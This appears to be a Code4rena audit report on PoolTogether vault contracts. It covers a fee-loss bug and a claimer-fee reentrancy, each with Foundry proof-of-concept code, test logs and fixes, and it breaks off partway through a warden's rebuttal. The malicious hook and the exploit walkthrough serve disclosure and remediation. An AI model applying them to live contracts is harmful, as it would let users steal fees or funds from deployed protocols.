---
sponsor: "PoolTogether"
slug: "2024-03-pooltogether"
date: "2024-04-04"
title: "PoolTogether"
findings: "https://github.com/code-423n4/2024-03-pooltogether-findings/issues"
contest: 332
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the PoolTogether smart contract system written in Solidity. The audit took place between March 4 — March 11, 2024.

## Wardens

85 Wardens contributed reports to PoolTogether:

  1. [d3e4](https://code4rena.com/@d3e4)
  2. [0xhunter20](https://code4rena.com/@0xhunter20)
  3. [Al-Qa-qa](https://code4rena.com/@Al-Qa-qa)
  4. [pa6kuda](https://code4rena.com/@pa6kuda)
  5. [Afriauditor](https://code4rena.com/@Afriauditor)
  6. [0xmystery](https://code4rena.com/@0xmystery)
  7. [carrotsmuggler](https://code4rena.com/@carrotsmuggler)
  8. [Infect3d](https://code4rena.com/@Infect3d)
  9. [0xabhay](https://code4rena.com/@0xabhay)
  10. [Timenov](https://code4rena.com/@Timenov)
  11. [Omik](https://code4rena.com/@Omik)
  12. [CodeWasp](https://code4rena.com/@CodeWasp) ([slylandro\_star](https://code4rena.com/@slylandro_star), [kuprum](https://code4rena.com/@kuprum), [audithare](https://code4rena.com/@audithare) and [spaghetticode\_sentinel](https://code4rena.com/@spaghetticode_sentinel))
  13. [Drynooo](https://code4rena.com/@Drynooo)
  14. [0xepley](https://code4rena.com/@0xepley)
  15. [slvDev](https://code4rena.com/@slvDev)
  16. [DarkTower](https://code4rena.com/@DarkTower) ([OxTenma](https://code4rena.com/@OxTenma), [0xrex](https://code4rena.com/@0xrex) and [haxatron](https://code4rena.com/@haxatron))
  17. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  18. [souilos](https://code4rena.com/@souilos)
  19. [albahaca](https://code4rena.com/@albahaca)
  20. [Aymen0909](https://code4rena.com/@Aymen0909)
  21. [Tripathi](https://code4rena.com/@Tripathi)
  22. [0x11singh99](https://code4rena.com/@0x11singh99)
  23. [shamsulhaq123](https://code4rena.com/@shamsulhaq123)
  24. [trachev](https://code4rena.com/@trachev)
  25. [FastChecker](https://code4rena.com/@FastChecker)
  26. [turvy\_fuzz](https://code4rena.com/@turvy_fuzz)
  27. [Abdessamed](https://code4rena.com/@Abdessamed)
  28. [btk](https://code4rena.com/@btk)
  29. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  30. [Giorgio](https://code4rena.com/@Giorgio)
  31. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  32. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  33. [SAQ](https://code4rena.com/@SAQ)
  34. [dvrkzy](https://code4rena.com/@dvrkzy)
  35. [McToady](https://code4rena.com/@McToady)
  36. [JCK](https://code4rena.com/@JCK)
  37. [clara](https://code4rena.com/@clara)
  38. [popeye](https://code4rena.com/@popeye)
  39. [LinKenji](https://code4rena.com/@LinKenji)
  40. [K42](https://code4rena.com/@K42)
  41. [aariiif](https://code4rena.com/@aariiif)
  42. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  43. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  44. [dharma09](https://code4rena.com/@dharma09)
  45. [unique](https://code4rena.com/@unique)
  46. [SY\_S](https://code4rena.com/@SY_S)
  47. [0xJoyBoy03](https://code4rena.com/@0xJoyBoy03)
  48. [smbv-1923](https://code4rena.com/@smbv-1923)
  49. [0xlemon](https://code4rena.com/@0xlemon)
  50. [aua\_oo7](https://code4rena.com/@aua_oo7)
  51. [Dots](https://code4rena.com/@Dots)
  52. [AgileJune](https://code4rena.com/@AgileJune)
  53. [leegh](https://code4rena.com/@leegh)
  54. [GoSlang](https://code4rena.com/@GoSlang)
  55. [zhaojie](https://code4rena.com/@zhaojie)
  56. [radin100](https://code4rena.com/@radin100)
  57. [yotov721](https://code4rena.com/@yotov721)
  58. [y4y](https://code4rena.com/@y4y)
  59. [0xkeesmark](https://code4rena.com/@0xkeesmark)
  60. [0xRiO](https://code4rena.com/@0xRiO)
  61. [gesha17](https://code4rena.com/@gesha17)
  62. [iberry](https://code4rena.com/@iberry)
  63. [sammy](https://code4rena.com/@sammy)
  64. [Fitro](https://code4rena.com/@Fitro)
  65. [Greed](https://code4rena.com/@Greed)
  66. [0xJaeger](https://code4rena.com/@0xJaeger)
  67. [wangxx2026](https://code4rena.com/@wangxx2026)
  68. [dd0x7e8](https://code4rena.com/@dd0x7e8)
  69. [yvuchev](https://code4rena.com/@yvuchev)
  70. [Daniel526](https://code4rena.com/@Daniel526)
  71. [kR1s](https://code4rena.com/@kR1s)
  72. [n1punp](https://code4rena.com/@n1punp)
  73. [AcT3R](https://code4rena.com/@AcT3R)
  74. [SoosheeTheWise](https://code4rena.com/@SoosheeTheWise)
  75. [valentin\_s2304](https://code4rena.com/@valentin_s2304)
  76. [asui](https://code4rena.com/@asui)
  77. [crypticdefense](https://code4rena.com/@crypticdefense)
  78. [marqymarq10](https://code4rena.com/@marqymarq10)
  79. [DanielTan\_MetaTrust](https://code4rena.com/@DanielTan_MetaTrust)
  80. [Krace](https://code4rena.com/@Krace)

This audit was judged by [hansfriese](https://code4rena.com/@hansfriese (judge)).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 9 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 8 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 7 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 10 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 PoolTogether repository](https://github.com/code-423n4/2024-03-pooltogether), and is composed of 6 smart contracts written in the Solidity programming language and includes 648 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **Cygnet** from warden rjs, generated the [Automated Findings report](https://github.com/code-423n4/2024-03-pooltogether/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (1)

## [[H-01] Any fee claim lesser than the total `yieldFeeBalance` as unit of shares is lost and locked in the `PrizeVault` contract](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/59)
*Submitted by [DarkTower](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/59), also found by [0xJoyBoy03](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/348), [smbv-1923](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/342), [d3e4](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/328), [0xlemon](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/323), [trachev](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/320), [aua\_oo7](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/302), [Afriauditor](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/281), [Aymen0909](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/272), [FastChecker](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/269), [Dots](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/264), [AgileJune](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/256), [leegh](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/252), [Tripathi](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/240), [turvy\_fuzz](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/233), [GoSlang](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/232), [McToady](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/223), [zhaojie](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/207), [radin100](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/200), [yotov721](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/180), [y4y](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/176), [0xkeesmark](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/174), [0xRiO](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/168), [gesha17](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/167), [iberry](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/156), [0xmystery](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/155), [sammy](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/152), [Fitro](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/142), [Greed](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/135), [0xJaeger](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/132), [wangxx2026](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/130), [dd0x7e8](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/127), [yvuchev](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/125), [Abdessamed](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/107), [Daniel526](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/103), [kR1s](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/98), [n1punp](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/88), [AcT3R](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/86), [SoosheeTheWise](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/81), [valentin\_s2304](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/79), [btk](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/76), [pa6kuda](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/73), [Al-Qa-qa](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/69), [asui](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/62), [dvrkzy](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/52), [crypticdefense](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/29), [marqymarq10](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/23), [DanielTan\_MetaTrust](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/11), and [Krace](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/10)*

Any fee claim by the fee recipient lesser than the accrued internal accounting of the `yieldFeeBalance` is lost and locked in the `PrizeVault` contract with no way to pull out the funds.

### Proof of Concept

The `claimYieldFeeShares` allows the `yieldFeeRecipient` fee recipient to claim fees in yields from the `PrizeVault` contract. The claimer can claim up to the `yieldFeeBalance` internal accounting and no more. The issue with this function is it presents a vulnerable area of loss with the `_shares` argument in the sense that if the accrued yield fee shares is 1000 shares and the claimer claims only 10, 200 or even any amount less than 1000, they forfeit whatever is left of the `yieldFeeBalance` (e.g if you claimed 200 and hence, got minted 200 shares, you lose the remainder 800 because it wipes the `yieldFeeBalance` 1000 balance; whereas, they only minted 200 shares).

Let's see a code breakdown of the vulnerable `claimYieldFeeShares` function:

```js
function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
        if (_shares == 0) revert MintZeroShares();

        uint256 _yieldFeeBalance = yieldFeeBalance;
        if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);

        yieldFeeBalance -= _yieldFeeBalance; // @audit issue stems and realized next line of code

        _mint(msg.sender, _shares); // @audit the point where the claimant gets to lose

        emit ClaimYieldFeeShares(msg.sender, _shares);
    }
```

This line of the function caches the total yield fee balance accrued in the contract and hence, the fee recipient is entitled to (e.g 100).

```js
uint256 _yieldFeeBalance = yieldFeeBalance;
```

This next line of code enforces a comparison check making sure the claimer cannot grief other depositors in the vault because the claimant could, for example, try to claim and mint 150 shares; whereas, they are only entitled to 100.

```js
if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);
```

This line of code subtracts the cached total yield fee balance from the state yield fee balance (e.g 100 - 100). So if say Bob, the claimant, tried to only mint 50 shares at this point in time with the `_shares` argument, the code wipes the entire balance of 100.

```js
yieldFeeBalance -= _yieldFeeBalance;
```

And this line of code then mints the specified `_shares` amount (e.g 50 shares) to Bob:

```js
_mint(msg.sender, _shares);
```

So what essentially happens is:

- Total accrued fee is 100.
- Bob claims 50 shares of the 100.
- Bob gets minted 50 shares.
- Bob loses the rest 50 shares.

Here's a POC for this issue. Place the `testUnclaimedFeesLostPOC` function inside the `PrizeVault.t.sol` file and run the test.

```js
function testUnclaimedFeesLostPOC() public {
        vault.setYieldFeePercentage(1e8); // 10%
        vault.setYieldFeeRecipient(bob); // fee recipient bob
        assertEq(vault.totalDebt(), 0); // no deposits in vault yet

        // alice makes an initial deposit of 100 WETH
        underlyingAsset.mint(alice, 100e18);
        vm.startPrank(alice);
        underlyingAsset.approve(address(vault), 100e18);
        vault.deposit(100e18, alice);
        vm.stopPrank();

        console.log("Shares balance of Alice post mint: ", vault.balanceOf(alice));

        assertEq(vault.totalAssets(), 100e18);
        assertEq(vault.totalSupply(), 100e18);
        assertEq(vault.totalDebt(), 100e18);

        // mint yield to the vault and liquidate
        underlyingAsset.mint(address(vault), 100e18);
        vault.setLiquidationPair(address(this));
        uint256 maxLiquidation = vault.liquidatableBalanceOf(address(underlyingAsset));
        uint256 amountOut = maxLiquidation / 2;
        uint256 yieldFee = (100e18 - vault.yieldBuffer()) / (2 * 10); // 10% yield fee + 90% amountOut = 100%
        vault.transferTokensOut(address(0), bob, address(underlyingAsset), amountOut);
        console.log("Accrued yield post in the contract to be claimed by Bob: ", vault.yieldFeeBalance());
        console.log("Yield fee: ", yieldFee);
        // yield fee: 4999999999999950000
        // alice mint: 100000000000000000000

        assertEq(vault.totalAssets(), 100e18 + 100e18 - amountOut); // existing balance + yield - amountOut
        assertEq(vault.totalSupply(), 100e18); // no change in supply since liquidation was for assets
        assertEq(vault.totalDebt(), 100e18 + yieldFee); // debt increased since we reserved shares for the yield fee

        vm.startPrank(bob);
        vault.claimYieldFeeShares(1e17);
        
        console.log("Accrued yield got reset to 0: ", vault.yieldFeeBalance());
        console.log("But the shares minted to Bob (yield fee recipient) should be 4.9e18 but he only has 1e17 and the rest is lost: ", vault.balanceOf(bob));

        // shares bob: 100000000000000000
        assertEq(vault.totalDebt(), vault.totalSupply());
        assertEq(vault.yieldFeeBalance(), 0);
        vm.stopPrank();
    }
```

```js
Test logs and results:
Logs:
  Shares balance of Alice post mint:  100000000000000000000
  Accrued yield in the contract to be claimed by Bob:  4999999999999950000
  Yield fee:  4999999999999950000
  Accrued yield got reset to 0:  0
  But the shares minted to Bob (yield fee recipient) should be 4.9e18 but he only has 1e17 and the rest is lost:  100000000000000000
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Adjust the `claimYieldFeeShares` to only deduct the amount claimed/minted:

```diff
function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
  if (_shares == 0) revert MintZeroShares();

-  uint256 _yieldFeeBalance = yieldFeeBalance;
-  if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);
+  if (_shares > yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, yieldFeeBalance);

-  yieldFeeBalance -= _yieldFeeBalance;
+  yieldFeeBalance -= _shares;

  _mint(msg.sender, _shares);

  emit ClaimYieldFeeShares(msg.sender, _shares);
}
```

**[trmid (PoolTogether) confirmed and commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/59#issuecomment-1998568348):**
 > Mitigated [here](https://github.com/GenerationSoftware/pt-v5-vault/pull/85).

***
 
# Medium Risk Findings (8)

## [[M-01] The winner can steal claimer fees, and force him to pay for the gas](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345)
*Submitted by [Al-Qa-qa](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345), also found by [Infect3d](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/263) and [souilos](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/360)*

When the winner earns his reward he can either claim it himself, or he can let a claimer contract withdraw it on his behalf, and he will pay part of his reward for that. This is because the user will not pay for the gas fees; instead the claimer contract will pay it instead.

The problem here is that the winner can make the claimer pay for the gas of the transaction, without paying the fees that the claimer contract takes.

Claimer contracts are allowed for anyone to use them, transfer prizes to winners, and claim some fees; where the one who fired the transaction is the one who will pay for the fees, so he deserved those fees.

[pt-v5-claimer/Claimer.sol#L120-L150](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L120-L150)

```solidity
  // @audit and one can call the function
  function claimPrizes( ... ) external returns (uint256 totalFees) {
    ...

    if (!feeRecipientZeroAddress) {
      ...
    }

    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);
  }
```

As in the function, the function takes the winners and he passed the fee recipient and his fees (but it should not exceed the `maxFees`, which is initialized in the constructor).

Now we know that anyone can transfer winners' prizes and claim some fees.

Before the prizes are claimed, the winner can initialize a hook before calling the `PoolPrize::claimPrize`. This is used if the winner wants to initialize another address as the receiver of the reward. The hook parameter is passed by parameters that are used to determine the correct winner (winner address, tier, `prizeIndex`).

[abstract/Claimable.sol#L85-L95](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L85-L95)

```solidity
    uint24 public constant HOOK_GAS = 150_000;

    ...

    function claimPrize( ... ) external onlyClaimer returns (uint256) {
        address recipient;

        if (_hooks[_winner].useBeforeClaimPrize) {
            recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }(
                _winner,
                _tier,
                _prizeIndex,
                _reward,
                _rewardRecipient
            );
        } else {
            recipient = _winner;
        }

        if (recipient == address(0)) revert ClaimRecipientZeroAddress();

        uint256 prizeTotal = prizePool.claimPrize( ... );
      
        ...
    }
```

But to prevent `OOG` the gas is limited to `150K`.

Now what the user can do to make the claimer pay for the transaction, and not pay any fees is:

- He will make a `beforeClaimPrize` hook.
- In this function, the user will simply claim his reward `Claimer::claimPrizes(...params)` but with settings no fees, and only passing his winning prize parameters (we got them from the hook).
- The winner (attacker) will not do any further interaction to not make the tx go `OOG` (remember we have only 150k).
- After the user claims his reward, he will simply return his address (the winner's address).
- The Claimer contract will go to claim this winner's rewards, but it will return 0 as it is already claimed.
- The Claimer will complete his process (claiming other prizes on behalf of winners).
- The winner (attacker) will end up claiming his reward without paying for the transaction gas fees.

Note: The Claimer claiming function will not revert, as if the prize was already claimed the function will just emit an event and will not revert.

[pt-v5-claimer/Claimer.sol#L194-L198](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L194-L198)

```solidity
  function _claim( ... ) internal returns (uint256) {
    ...

        try
          _vault.claimPrize(_winners[w], _tier, _prizeIndices[w][p], _feePerClaim, _feeRecipient)
        returns (uint256 prizeSize) {
          if (0 != prizeSize) {
            actualClaimCount++;
          } else {
            // @audit Emit an event if the prize already claimed
            emit AlreadyClaimed(_winners[w], _tier, _prizeIndices[w][p]);
          }
        } catch (bytes memory reason) {
          emit ClaimError(_vault, _tier, _winners[w], _prizeIndices[w][p], reason);
        }

    ...
  }
```

The only check that can prevent this attack is the gas cost of calling `beforeClaimPrize` hook.

We will call one function `Claimer::claimPrizes()` by only passing one winner, and without fees. We calculated the gas that can be used by installing protocol contracts (Claimer and PrizePool), then grab a test function that first the function we need, and we get these results:

- Calling `Claimer::claimPrize()` costs `5292 gas` if it did not claimed anything.
- Calling `PrizePool::claimePrize()` costs `118124 gas`.

So the total gas that can be used is `$118,124 + 5292 = $123,416` which is smaller than `HOOK_GAS` by more than `25K`, so the function will not revert because of OOG error, and the reentrancy will occur.

Another thing that may lead to a misunderstanding is that the Judger may say if this happens the function will go to `beforeClaimPrize` hook again leading to infinite loop and the transaction will go `OOG`. However, making the transaction `beforeClaimPrize` be fired to make a result and when called again do another logic is an easy task that can be made by implementing a counter or something. However, we did not implement this counter in our test. We just wanted to point out how the attack will work in our POC, but in real interactions, there should be some edge cases to take care of and further configurations to take care off.

### Proof of Concept

We made a simulation of how the function will occur. We found that the testing environment made by the devs is abstracted a little bit compared to the real flow of transactions in the production mainnet, so I made Mock contracts, and simulated the attack with them. Please go for the testing script step by step, and it will work as intended.

1. Add the following Imports and scripts in [`test/Claimable.t.sol::L8`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L8)

<details>
  <summary>Imports and Contracts</summary>

```solidity
import { console2 } from "forge-std/console2.sol";
import { PrizePoolMock } from "../contracts/mock/PrizePoolMock.sol";

contract Auditor_MockPrizeToken {
    mapping(address user => uint256 balance) public balanceOf;

    function mint(address user, uint256 amount) public {
        balanceOf[user] += amount;
    }

    function burn(address user, uint256 amount) public {
        balanceOf[user] -= amount;
    }
}

contract Auditor_PrizePoolMock {
    Auditor_MockPrizeToken public immutable prizeToken;

    constructor(address _prizeToken) {
        prizeToken = Auditor_MockPrizeToken(_prizeToken);
    }

    // The reward is fixed to 100 tokens
    function claimPrize(
        address winner,
        uint8 /* _tier */,
        uint32 /* _prizeIndex */,
        address /* recipient */,
        uint96 reward,
        address rewardRecipient
    ) public returns (uint256) {
        // Distribute rewards if the PrizePool earns a reward
        if (prizeToken.balanceOf(address(this)) >= 100e18) {
            prizeToken.mint(winner, 100e18 - uint256(reward)); // Transfer reward tokens to the winner
            // Transfer fees to the claimer Receipent.
            // Instead of adding balance to the PrizePool contract and then the claimerRecipent
            // Can withdraw it, we will transfer it to the claimerRecipent directly in our simulation
            prizeToken.mint(rewardRecipient, reward);
             // Simulating Token transfereing by minting and burning
            prizeToken.burn(address(this), 100e18);
        } else {
            return 0;
        }

        return uint256(100e18);
    }
}

contract Auditor_Claimer {
    ClaimableWrapper public immutable prizeVault;

    constructor(address _prizeVault) {
        prizeVault = ClaimableWrapper(_prizeVault);
    }

    function claimPrizes(
        address[] calldata _winners,
        uint8 _tier,
        uint256 _claimerFees,
        address _feeRecipient
    ) external {
        for (uint i = 0; i < _winners.length; i++) {
            prizeVault.claimPrize(_winners[i], _tier, 0, uint96(_claimerFees), _feeRecipient);
        }
    }
}
```

</details>
<br>

2. Add the following functions in [`test/Claimable.t.sol::L132`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L132)

<details>

  <summary>Testing Functions</summary>

```solidity
  Auditor_Claimer __claimer;

  function testAuditor_winnerStealClaimerFees() public {
      console2.log("Winner reward is 100 tokens");
      console2.log("Fees are 10% (10 tokens)");
      console2.log("=============");
      console2.log("Simulating the normal Operation (No stealing)");
      auditor_complete_claim_proccess(false);
      console2.log("=============");
      console2.log("Simulating winner steal recipent fees");
      auditor_complete_claim_proccess(true);
  }

  function auditor_complete_claim_proccess(bool willSteal) internal {
      // If tier is 1 we will take the claimer fees and if 0 we will do nothing
      uint8 tier = willSteal ? 1 : 0;

      Auditor_MockPrizeToken __prizeToken = new Auditor_MockPrizeToken();
      Auditor_PrizePoolMock __prizePool = new Auditor_PrizePoolMock(address(__prizeToken));

      address __winner = makeAddr("winner");
      address __claimerRecipent = makeAddr("claimerRecipent");

      // This will be like the `PrizeVault` that has the winner
      ClaimableWrapper __claimable = new ClaimableWrapper(
          PrizePool(address(__prizePool)),
          address(1)
      );

      // Claimer contract, that can transfer winners rewards
      __claimer = new Auditor_Claimer(address(__claimable));
      // Set new Claimer
      __claimable.setClaimer(address(__claimer));

      VaultHooks memory beforeHookOnly = VaultHooks(true, false, hooks);

      vm.startPrank(__winner);
      __claimable.setHooks(beforeHookOnly);
      vm.stopPrank();

      // PrizePool earns 100 tokens from yields, and we picked the winner
      __prizeToken.mint(address(__prizePool), 100e18);

      address[] memory __winners = new address[](1);
      __winners[0] = __winner;

      // Claim Prizes by providing `__claimerRecipent`
      __claimer.claimPrizes(__winners, tier, 10e18, __claimerRecipent);

      console2.log("Winner PrizeTokens:", __prizeToken.balanceOf(__winner) / 1e18, "token");
      console2.log(
          "ClaimerRecipent PrizeTokens:",
          __prizeToken.balanceOf(__claimerRecipent) / 1e18,
          "token"
      );
  }
```

</details>
<br>

3. Change [`beforeClaimPrize`](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/test/unit/Claimable.t.sol#L254-L274) hook function, and replace it with the following:

```solidity
    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint96 reward,
        address rewardRecipient
    ) external returns (address) {
        address[] memory __winners = new address[](1);
        __winners[0] = winner;

        if (tier == 1) {
            __claimer.claimPrizes(__winners, 0, 0, rewardRecipient);
        }

        return winner;
    }
```

4. Check that everything is correct and run:

```powershell
forge test --mt testAuditor_winnerStealClaimerFees -vv
```

**Output**:

```powershell
  Winner reward is 100 tokens
  Fees are 10% (10 tokens)
  =============
  Simulating the normal Operation (No stealing)
  Winner PrizeTokens: 90 token
  ClaimerRecipent PrizeTokens: 10 token
  =============
  Simulating winner steal recipient fees
  Winner PrizeTokens: 100 token
  ClaimerRecipent PrizeTokens: 0 token
```

In this test, we first made a reward and withdrew it from our Claimer contract normally (no attack happened). Then, we made another prize reward but by making the attack when withdrawing it, which can be seen in the Logs.

### Tools Used

Foundry

### Recommended Mitigation Steps

We can check the prize state before and after the hook; if it changes from unclaimed to claimed, we can revert the transaction.

**Claimable.sol:**

```diff
    function claimPrize( ... ) external onlyClaimer returns (uint256) {
        address recipient;

        if (_hooks[_winner].useBeforeClaimPrize) {
+           bool isClaimedBefore = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);
            recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }( ... );
+           bool isClaimedAfter = prizePool.wasClaimed(address(this), _winner, _tier, _prizeIndex);

+           if (isClaimedBefore == false && isClaimedAfter == true) {
+               revert("The Attack Occuared");
+           }
        } else { ... }
        ...
    }

```

*Note: We were writing this issue 30 minutes before ending of the audit - the mitigation review may not be the best, or may not work (we did not test it). Devs should keep this in mind when mitigating this issue.*

### Assessed type

Reentrancy

**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-1992497462):**
 > `Claimable::claimPrize` has the visibility of `onlyClaimer` denying the winner's hook reentrancy. The winner can't any prize unless he/she is the permitted claimer.

**[hansfriese (judge) decreased severity to Low](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-1999157985)**

**[Al-Qa-qa (warden) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/345#issuecomment-2006932930):**
 > @hansfriese - There is a misunderstanding of this issue with its group (`78`), and I will illustrate how this occurs.
> 
> There are three contracts that we will deal with for making this exploit:
> - `PrizeVault(Claimable)`: this is the claimable contract that has the function to give a winner his prize.
> - `Claimer`: The contract that has the authority to transfer the prize to the winner (from the Claimable contract).
> - `PrizePool`: The Contract that has the prize, which we will be called to claim the prize and give it to the winner.
> 
> The issue was rejected by replying that the `onlyClaimer` modifier prevents the hook from returning and calling the function again. So the judge thought that I said the `beforeClaimHook` will call `Claimable::claimPrize()`, and this is not what I said in my report.
> 
> In my report, I said that the hook will go to the Claimer contract itself, and call the `claimPrizes` function (the function that is in Claimer contract that fires `PrizeVault(Claimable)::claimPrize`.
> 
> `beforeClaimHook` will call `Claimer::claimPrizes()` which will call `Claimable::claimPrize()`
> 
> > - He will make a `beforeClaimPrize` hook.
> > - In this function, the user will simply claim his reward `Claimer::claimPrizes(...params)` but with settings no fees, and only passing his winning prize parameters (we got them from the hook).
> 
> I think the conflict occurs as `Claimer` and `Claimable` are two different contracts, but they have similar names as well as the function names are also similar `claimPrize` and `claimPrizes`.
> 
> I illustrated in my report that the way the Claimer contract design is not restricted and, anyone can use it to claim fees and send prizes to the winners.
> 
> > [Claimer.sol#L120-L150](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L120-L150)
> > ```solidity
> >   // @audit and one can call the function
> >  function claimPrizes( ... ) external returns (uint256 totalFees) {
> >   ...
> >
> >   if (!feeRecipientZeroAddress) {
> >      ...
> >   }
> >
> >    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);
> >  }
> > ```
> 
> According to @raymondfam's comment for rejecting this issue:
> 
> > Claimable::claimPrize has the visibility of onlyClaimer denying the winner's hook reentrancy. The winner can't any prize unless he/she is the permitted claimer.
> 
> Anyone can be a permitted claimer as the function that interacts with the `PrizeVault(Claimable)` is accessible to anyone, as I showed here and in my report.
> 
> In my report I did not say that the hook will go to fire `PrizeVault(Claimable)::claimPrize` directly, Instead, I said that it will call `Claimer::claimPrizes()`.
>
> So the pass will be the following:
> 
> We will use (MEV searcher) to represent the one that claims winners' prizes using Claimer contract.
> 
> 1. MEV searcher call `Claimer::claimPrizes(...params)`, providing more than one winner.
> 2. When the malicious winner prize is the next one on the queue, `beforeClaimPrize` will be used to call `Claimer::claimPrizes()` again, using the parameters passed to it, and the winner prize will get claimed using MEV searcher gas, but without paying the fees to the MEV searcher.
> 3. Since the Prize already claimed, the MEV searcher will not be able to reclaim it again, and will gain 0 fees (Knowing that he is the one who paid for the gas in the first place).
> 
> **PASS:**
> 1. `MEV--Claimer::claimPrizes(...)`.
> 2. `PrizeVault(Claimabe)::claimPrize()`.
> 3. `PrizeVault(Claimabe):WinnerHook:beforeClaimPrize()`.
> 4. `WinnerHook--Claimer::claimPrizes()` (with winner (attacker) params, no fees).
> 5. `PrizeVault(Claimabe)::claimPrize()`  (with winner (attacker) params, no fees).
